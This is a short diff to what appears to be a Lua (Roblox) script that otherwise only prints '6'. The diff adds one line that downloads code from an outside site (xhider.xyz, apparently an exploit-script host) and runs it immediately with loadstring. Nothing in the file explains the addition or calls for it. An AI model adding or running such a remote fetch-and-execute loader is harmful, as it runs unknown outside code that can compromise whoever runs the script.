@@ -1,1 +1,3 @@
 print'6'
+
+loadstring(game:HttpGet("https://xhider.xyz/raw/InfinityScript/upvalues.lua"))()
